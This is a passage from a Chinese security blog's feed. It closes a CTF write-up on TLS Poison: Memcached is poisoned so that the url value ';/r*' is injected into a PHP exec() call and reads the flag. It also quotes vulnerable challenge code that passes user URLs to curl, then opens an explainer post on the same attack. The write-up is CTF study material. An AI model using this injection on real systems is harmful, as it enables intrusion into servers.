2\r\nOK\r\n</code>&#xFF0C;&#x5176;&#x4E2D;&#x90A3;&#x4E32;&#x8FDE;&#x7EED;&#x6570;&#x5B57;&#x6211;&#x7528;&#x6765;&#x8868;&#x793A; sandbox id</p></li><li><p>&#x5E26;&#x7740;&#x6700;&#x5F00;&#x59CB;&#x8BBE;&#x7F6E;&#x7684; cookie &#x5411;&#x9898;&#x76EE;&#x63D0;&#x4EA4; url &#x5730;&#x5740;&#x4E3A;<code>;/r*</code>&#xFF0C;&#x6B64;&#x65F6;&#x9898;&#x76EE;&#x5411; Memcached &#x67E5;&#x8BE2; <code>1234567890;/r*</code>&#x7684;&#x503C;&#xFF0C;&#x5F97;&#x5230; url &#x7684;&#x503C;&#x4E3A; OK &#xFF0C;&#x7ED5;&#x8FC7;&#x9650;&#x5236;</p></li><li><p>&#x9898;&#x76EE;&#x6267;&#x884C;<code>exec(&quot;timeout -s KILL 3 git ls-remote --tags -- $url&quot;, $output, $return_var);</code>&#xFF0C;&#x5176;&#x4E2D;<code>$url</code>&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;<code>;/r*</code>&#xFF0C;&#x5B8C;&#x6210;&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#xFF0C;&#x6267;&#x884C;&#x8BFB;&#x53D6; flag &#x547D;&#x4EE4;&#x62FF;&#x5230; flag </p></li></ul><p>&#x81F3;&#x6B64;&#xFF0C;&#x5B8C;&#x6210;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684; FTPS &#x89E3;&#x6CD5;&#x3002;exp &#x6548;&#x679C;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210515015923.png" alt></p><h3 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h3><p>&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x89E3;&#x6CD5;&#x4E5F;&#x662F;&#x540E;&#x6765;&#x95EE;&#x7684; 0xbb &#x51FA;&#x9898;&#x4EBA;&#xFF0C;&#x5176;&#x5B9E;&#x9884;&#x671F;&#x89E3;&#x6CD5;&#x662F;&#x5229;&#x7528; FTPS &#x7684;&#x89E3;&#x6CD5;&#x3002;&#x4F46;&#x662F;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x961F;&#x53CB;&#x8FD8;&#x627E;&#x5230;&#x4E86;&#x4E00;&#x5904;&#x5176;&#x4ED6;&#x53EF;&#x80FD;&#x7684;&#x5730;&#x65B9;&#x60F3;&#x7740; SSRF &#x6765;&#x7740;&#xFF0C;&#x4F46;&#x662F;&#x540E;&#x6765;&#x4E0D;&#x592A;&#x884C;&#xFF0C;&#x540E;&#x9762;&#x8DDF; Perfect Blue &#xFF08;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x6B21;&#x53C2;&#x8D5B;&#x7684;&#x8054;&#x5408;&#x6218;&#x961F; perfect guesser &#x7684;&#x8054;&#x5408;&#x961F;&#x4E4B;&#x4E00;&#xFF09;&#x7684;&#x670B;&#x53CB;&#x4EA4;&#x6D41;&#x4E86;&#x4E00;&#x4E0B;&#x786E;&#x5B9E;&#x662F;&#x7528; TLS Poison &#xFF0C;&#x5E76;&#x4E14;&#x4ED6;&#x8DDF; A0E &#x67D0;&#x4E2A;&#x5E08;&#x5085;&#x4E00;&#x6837;&#x4E5F;&#x91CD;&#x5199;&#x4E86; DNS &#x76F8;&#x5173;&#x90E8;&#x5206;&#x5185;&#x5BB9;2333</p><p>&#x5982;&#x679C;&#x4F60;&#x89C9;&#x5F97;&#x505A;&#x5B8C;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8FD8;&#x89C9;&#x5F97;&#x4E0D;&#x8FC7;&#x763E;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x53BB;&#x505A;&#x4E00;&#x4E0B; Tet CTF &#x7684;&#x4E00;&#x4E2A;&#x9898;&#x76EE;&#x3002;&#x5728;&#x8D8A;&#x5357;&#x7684; TetCTF 2021 &#x5F53;&#x4E2D;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x5355;&#x72EC;&#x7684;&#x5206;&#x7C7B; Web &amp; Crypto &#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x9053;&#x9898;&#xFF1A;HackEmAll-Next-Gen-Proxy &#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x5F53;&#x4E2D;&#x5C31;&#x6BD4;&#x8F83;&#x76F4;&#x63A5;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_set_cache</span><span class="hljs-params">(_key, _value)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> str(_key) != <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">and</span> str(_value) != <span class="hljs-string">&quot;&quot;</span>:</span><br><span class="line">        _cache_handle = pylibmc.Client([<span class="hljs-string">&quot;127.0.0.1:11211&quot;</span>], binary=<span class="hljs-literal">False</span>)</span><br><span class="line">        _cache_handle.set(_key, _value, time=<span class="hljs-number">60</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_get_cache</span><span class="hljs-params">(_key)</span>:</span></span><br><span class="line">    _cache_handle= pylibmc.Client([<span class="hljs-string">&quot;127.0.0.1:11211&quot;</span>], binary=<span class="hljs-literal">False</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> _cache_handle.get(_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span><span class="hljs-params">(_url)</span>:</span></span><br><span class="line">    _cmd = [<span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-string">&quot;-k&quot;</span>, str(_url)]</span><br><span class="line">    _content = subprocess.check_output(_cmd)</span><br><span class="line">    <span class="hljs-keyword">return</span> _content.encode(<span class="hljs-string">&apos;hex&apos;</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x5C31;&#x5DF2;&#x7ECF;&#x6709;&#x975E;&#x5E38;&#x660E;&#x663E;&#x7684;&#x63D0;&#x793A;&#x4E86;&#xFF0C;&#x540C;&#x6837;&#x662F;&#x719F;&#x6089;&#x7684; Memcached &#xFF0C;&#x540C;&#x6837;&#x662F;<code>-L</code>&#x9009;&#x578B;&#x7279;&#x5730;&#x5141;&#x8BB8; curl &#x91CD;&#x5B9A;&#x5411;&#xFF0C;&#x5F88;&#x6807;&#x51C6;&#x7684;&#x4E00;&#x9053; TLS Poison &#x9898;&#x76EE;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x591A;&#x5570;&#x55E6;&#x4E86;&#x3002;&#x4E0D;&#x8FC7;&#x5BF9;&#x4E8E;&#x8FD9;&#x9898;&#xFF0C;&#x4EE5;&#x53CA;<code>-L</code>&#x9009;&#x9879;&#xFF0C;&#x5F53;&#x65F6;&#x6709;&#x9009;&#x624B;&#x60F3;&#x51FA;&#x4F7F;&#x7528; gopher &#x6765;&#x505A;&#x8FD9;&#x4E2A;&#x9898;&#xFF0C;&#x672C;&#x5730;&#x90FD;&#x80FD;&#x6253;&#xFF0C;&#x4F46;&#x662F;&#x5230;&#x4E86;&#x8FDC;&#x7A0B;&#x5C31;&#x62C9;&#x57AE;&#x4E86;&#xFF0C;&#x539F;&#x56E0;&#x662F;&#x5728;&#x65B0;&#x7248;&#x7684; curl &#x4E2D;&#xFF0C;&#x5C31;&#x50CF;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x9A8C;&#x8BC1;&#x7684;&#x4E00;&#x6837;&#xFF0C; gopher &#x534F;&#x8BAE;&#x5DF2;&#x7ECF;&#x4E0D;&#x518D;&#x662F; libcurl &#x9ED8;&#x8BA4;&#x652F;&#x6301;&#x7684;&#x91CD;&#x5B9A;&#x5411;&#x534F;&#x8BAE;&#x4E86;&#xFF0C;&#x53EA;&#x6709; HTTP/HTTPS &#x548C; FTP &#x662F;&#x9ED8;&#x8BA4;&#x652F;&#x6301;&#x91CD;&#x5B9A;&#x5411;&#xFF0C;&#x5177;&#x4F53;&#x89C1;&#xFF1A;<a href="https://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c" target="_blank" rel="noopener">https://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c</a></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>&#x81F3;&#x6B64;&#xFF0C;&#x672C;&#x7BC7;&#x52A0;&#x4E0A;&#x4E4B;&#x524D;&#x7684; <a href="https://blog.zeddyu.info/2021/04/20/tls-poison/">&#x300A;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; TLS Poison &#x653B;&#x51FB;&#x300B;</a> &#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x7B97;&#x662F;&#x628A; TLS Poison &#x7684;&#x7406;&#x8BBA;&#x3001;&#x5B9E;&#x8DF5;&#x3001; CTF &#x5E94;&#x7528;&#x90FD;&#x8BB2;&#x4E86;&#x4E00;&#x904D;&#xFF0C;&#x6216;&#x8BB8;&#x4EE5;&#x540E;&#x53EF;&#x80FD;&#x8FD8;&#x4F1A;&#x5F04;&#x4E2A; TLS Poison &#x653B;&#x51FB; SMTP &#x7684;&#x9776;&#x573A;&#xFF08;&#x5E94;&#x8BE5;&#x4E0D;&#x592A;&#x53EF;&#x80FD;&#xFF09;&#xFF0C;&#x4F46;&#x662F; TLS Poison &#x9700;&#x8981;&#x63A2;&#x7D22;&#x7684;&#x5185;&#x5BB9;&#x4F9D;&#x65E7;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x6BD4;&#x5982;&#x5BF9;&#x4E8E;&#x663E;&#x5F0F; FTPS &#x7684; TLS Poison &#x5229;&#x7528;&#x5316;&#x5DE5;&#x5177;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x4E86;<code>PASV</code>&#x6F0F;&#x6D1E;&#xFF0C;FTPS &#x8FD8;&#x6709;&#x6CA1;&#x6709;&#x5176;&#x4ED6;&#x65B9;&#x5F0F;&#x5229;&#x7528;&#x7B49;&#x7B49;&#x95EE;&#x9898;&#xFF0C;&#x90FD;&#x662F;&#x8FD8;&#x6709;&#x5F85;&#x5927;&#x5BB6;&#x8FDB;&#x4E00;&#x6B65;&#x53BB;&#x6316;&#x6398;&#x7684;&#x3002;</p><p>&#x8FD9;&#x4E9B;&#x5929;&#x90FD;&#x82B1;&#x4E86;&#x5F88;&#x591A;&#x7CBE;&#x529B;&#x5728;&#x90E8;&#x5206;&#x7814;&#x7A76;&#x4E0A;&#xFF0C;&#x4E00;&#x65B9;&#x9762;&#x786E;&#x5B9E;&#x6211;&#x89C9;&#x5F97; TLS Poison &#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x7CBE;&#x5F69;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x5C3D;&#x7BA1;&#x5B83;&#x5C40;&#x9650;&#x6027;&#x5F88;&#x5927;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x6574;&#x4F53;&#x6784;&#x9020;&#x5229;&#x7528;&#x90FD;&#x76F8;&#x5BF9;&#x6BD4;&#x8F83;&#x5DE7;&#x5999;&#xFF0C;&#x4E5F;&#x662F;&#x5BF9;&#x5728;&#x4F17;&#x591A;&#x5BF9; TLS &#x5BC6;&#x7801;&#x7B97;&#x6CD5;&#x7684;&#x653B;&#x51FB;&#x4E2D;&#x4EE4;&#x4EBA;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#xFF1B;&#x4E00;&#x65B9;&#x9762;&#x5BF9;&#x4E8E; CTF &#x9898;&#x76EE;&#xFF0C;&#x5C24;&#x5176;&#x662F; hxp &#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x6211;&#x4E00;&#x76F4;&#x803F;&#x803F;&#x4E8E;&#x6000;&#xFF0C;&#x51B5;&#x4E14;&#x6B63;&#x597D;&#x8FD9;&#x4E2A;&#x4E5F;&#x662F; TLS Poison &#x7684;&#x6DF1;&#x5C42;&#x6B21;&#x5229;&#x7528;&#xFF0C;&#x8FD9;&#x4E5F;&#x6210;&#x4E3A;&#x4E86;&#x540E;&#x6765;&#x6211;&#x6574;&#x7406; TLS Poison &#x653B;&#x51FB;&#x7684;&#x52A8;&#x529B;&#x6765;&#x6E90;&#x4E4B;&#x4E00;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4E5F;&#x89C9;&#x5F97; FTP &#x771F;&#x662F;&#x4E2A;&#x975E;&#x5E38;&#x6709;&#x610F;&#x601D;&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x800C;&#x8FD9;&#x9898;&#x9884;&#x671F;&#x7528;&#x5230; FTPS &#x5C31;&#x5FC5;&#x987B;&#x5F04;&#x61C2; TLS Poison &#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x4E0D;&#x5F97;&#x4E0D;&#x53BB;&#x628A; TLS Poison &#x5F04;&#x4E00;&#x904D;&#x3002;&#x6CA1;&#x5F04;&#x4E4B;&#x524D;&#x8FD8;&#x4EE5;&#x4E3A;&#x662F;&#x6BD4;&#x8F83;&#x96BE;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x770B;&#x5230;&#x597D;&#x51E0;&#x4E2A;&#x9009;&#x624B;&#x90FD;&#x91CD;&#x65B0;&#x5F04;&#x4E86; DNS &#x90E8;&#x5206;&#xFF0C;&#x751A;&#x81F3;&#x8FD8;&#x9700;&#x8981;&#x91CD;&#x5199;&#x4E00;&#x4E2A; DNS Server &#xFF0C;&#x4E0D;&#x8FC7;&#x5BF9;&#x4E8E;&#x6076;&#x610F; TLS &#x670D;&#x52A1;&#x8FD9;&#x4E00;&#x5757;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x6539;&#x5199; TLS &#x670D;&#x52A1;&#x6846;&#x67B6;&#x624D;&#x80FD;&#x505A;&#x3002;</p><p>&#x8FD8;&#x6709;&#x4E00;&#x65B9;&#x9762;&#x662F;&#xFF0C;&#x6211;&#x4E4B;&#x524D;&#x53D1;&#x670B;&#x53CB;&#x5708;&#x63A2;&#x8BA8; CTF &#x76F8;&#x5173;&#x4EF7;&#x503C;&#x89C2;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4EE5;&#x53CA; CTF &#x662F;&#x5426;&#x662F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x6700;&#x4F73;&#x5165;&#x95E8;&#x65B9;&#x5F0F;&#xFF0C;@Anciety &#x8BC4;&#x8BBA;&#x8BF4; CTF &#x53EF;&#x80FD;&#x4E0D;&#x662F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x5165;&#x95E8;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x4ED6;&#x8BA4;&#x4E3A;&#x662F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x7814;&#x7A76;&#x7684;&#x5165;&#x95E8;&#x65B9;&#x5F0F;&#x3002;&#x6B63;&#x5982;&#x4ED6;&#x6240;&#x8BF4;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A; CTF &#x9898;&#x76EE;&#xFF0C;&#x6211;&#x5BF9; TLS Poison &#x8FDB;&#x884C;&#x4E86;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x63A2;&#x7A76;&#xFF0C;&#x4E5F;&#x6709;&#x4E86;&#x66F4;&#x591A;&#x7684;&#x7406;&#x89E3;&#xFF0C;&#x8FD9;&#x53EF;&#x80FD;&#x5C31;&#x662F;&#x4E00;&#x9053;&#x826F;&#x597D;&#x7684; CTF &#x9898;&#x76EE;&#x7ED9;&#x5B89;&#x5168;&#x7814;&#x7A76;&#x8005;&#x5E26;&#x6765;&#x7684;&#x597D;&#x5904;&#x4E4B;&#x4E00;&#x5427;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x5E26;&#x7ED9;&#x4E86;&#x6211;&#x5F88;&#x591A;&#x5FEB;&#x4E50;&#xFF0C;&#x4E5F;&#x5E0C;&#x671B;&#x4EE5;&#x540E;&#x80FD;&#x9047;&#x5230;&#x66F4;&#x591A;&#x7C7B;&#x4F3C;&#x4F18;&#x79C0;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x80FD;&#x5F15;&#x5BFC;&#x3001;&#x63A8;&#x52A8;&#x6211;&#x53BB;&#x505A;&#x66F4;&#x591A;&#x6709;&#x610F;&#x601D;&#x66F4;&#x6DF1;&#x5C42;&#x6B21;&#x7684;&#x7814;&#x7A76;&#x3002;</p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2021/04/20/tls-poison/</id>
        <title><![CDATA[一篇文章带你读懂 TLS Poison 攻击]]></title>
        <updated>2021-06-01T02:31:38+08:00</updated>
        <link href="https://blog.zeddyu.info/2021/04/20/tls-poison/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2021/04/20/tls-poison/"><![CDATA[<html><head></head><body><p>&#x8FD9;&#x662F;&#x300A;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; XXX &#x653B;&#x51FB;&#x300B;&#x7CFB;&#x5217;&#x7684;&#x7B2C;&#x4E8C;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x4E3B;&#x8981;&#x8BB2;&#x8FF0; TLS Poison &#x653B;&#x51FB;&#x5BF9;&#x5E94;&#x7684;&#x4E09;&#x79CD;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x3001;&#x4E00;&#x4E9B;&#x53EF;&#x80FD;&#x7B97;&#x662F;&#x201C;&#x65B0;&#x201D;&#x7684; DNS Rebinding &#x6280;&#x5DE7;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x5173;&#x4E8E; IP &#x9009;&#x62E9;&#x63A2;&#x7D22;&#x7B49;&#x5185;&#x5BB9;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x96F7;&#x795E;&#x4F17;&#x6D4B;&#xFF0C;&#x5206;&#x4E3A;&#x7CFB;&#x5217;&#x6587;&#x7AE0;&#xFF1A;</p><p>&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; TLS Poison &#x653B;&#x51FB;&#xFF08;&#x4E00;&#xFF09;<a href="https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg</a></p><p>&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; TLS Poison &#x653B;&#x51FB;&#xFF08;&#x4E8C;&#xFF09;<a href="https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ</a></p><p>&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; TLS Poison &#x653B;&#x51FB;&#xFF08;&#x4E09;&#xFF09;<a href="https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg</a></p><p>&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; TLS Poison &#x653B;&#x51FB;&#xFF08;&#x56DB;&#xFF09;<a href="https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA</a></p></blockquote><a id="more"></a><p>[TOC]</p><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>&#x4F7F;&#x7528;&#x300A;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; XXX &#x653B;&#x51FB;&#x300B;&#x7684;&#x6807;&#x9898;&#x662F;&#x4E3A;&#x4E86;&#x7763;&#x4FC3;&#x81EA;&#x5DF1;&#x628A;&#x4E00;&#x4E2A;&#x653B;&#x51FB;&#x7684;&#x5C3D;&#x53EF;&#x80FD;&#x591A;&#x7684;&#x7EC6;&#x8282;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x641E;&#x61C2;&#xFF0C;&#x4E5F;&#x662F;&#x4E3A;&#x4E86;&#x63D0;&#x5347;&#x81EA;&#x5DF1;&#x7684;&#x5199;&#x4F5C;&#x4EE5;&#x53CA;&#x8868;&#x8FF0;&#x6C34;&#x5E73;&#x3002;&#x672C;&#x6587;&#x65E8;&#x5728;&#x5E2E;&#x52A9;&#x5927;&#x5BB6;&#x4E86;&#x89E3;&#x5B66;&#x4E60; TLS Poison &#x653B;&#x51FB;&#xFF0C;&#x5E0C;&#x671B;&#x901A;&#x8FC7;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x8BA9;&#x5927;&#x5BB6;&#x8BFB;&#x61C2; TLS Poison &#x653B;&#x51FB;&#xFF0C;&#x4F46;&#x662F;&#x4EC5;&#x4EC5;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#x6D89;&#x53CA;&#x5230;&#x5F88;&#x591A;&#x5185;&#x5BB9;&#xFF0C;&#x9760;&#x672C;&#x6587;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x5B8C;&#x5168;&#x8BFB;&#x61C2;&#x7684;&#xFF0C;&#x672C;&#x6587;&#x7684;&#x5185;&#x5BB9;&#x4E5F;&#x5E76;&#x975E;&#x5B8C;&#x5168;&#x6B63;&#x786E;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x5E0C;&#x671B;&#x5927;&#x5BB6;&#x62B1;&#x7740;&#x6000;&#x7591;&#x7684;&#x6001;&#x5EA6;&#x5408;&#x7406;&#x5BF9;&#x6587;&#x7AE0;&#x63D0;&#x51FA;&#x8D28;&#x7591;&#x3002;</p><p>&#x672C;&#x6587;&#x4E3B;&#x8981;&#x662F;&#x5BF9; <a href="https://www.blackhat.com/us-20/briefings/schedule/#when-tls-hacks-you-19446" target="_blank" rel="noopener">Black Hat USA 2020 - When TLS Hacks You</a> &#x8BAE;&#x9898;&#x7684;&#x6574;&#x7406;&#x4E0E;&#x590D;&#x76D8;&#xFF0C;&#x8BE5;&#x653B;&#x51FB;&#x662F;&#x4E00;&#x79CD;&#x5229;&#x7528; TLS &#x534F;&#x8BAE;&#x7279;&#x6027;&#x7ED3;&#x5408;&#x5BA2;&#x6237;&#x7AEF;&#x5B9E;&#x73B0;&#x7F3A;&#x9677;&#x8FBE;&#x5230;&#x653B;&#x51FB;&#x5185;&#x7F51;&#x5E94;&#x7528;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;&#x4EFB;&#x610F;&#x5199;&#x5165; Memcached &#x7B49;&#x5185;&#x7F51;&#x670D;&#x52A1;&#x7684;&#x653B;&#x51FB;&#x6548;&#x679C;&#xFF0C;&#x8FDB;&#x800C;&#x914D;&#x5408;&#x5176;&#x4ED6;&#x6F0F;&#x6D1E;&#x9020;&#x6210; RCE &#x7B49;&#x5371;&#x5BB3;&#x3002;</p><p>&#x8FD9;&#x662F;&#x53BB;&#x5E74;&#x7684;&#x5728; black hat USA &#x63D0;&#x51FA;&#x7684;&#x4E00;&#x9879;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x4F5C;&#x8005;&#x5728;&#x63D0;&#x51FA;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x79CD;&#x79CD;&#x56E0;&#x7D20;&#xFF0C;&#x4ED6;&#x653E;&#x51FA;&#x6765;&#x7684; demo 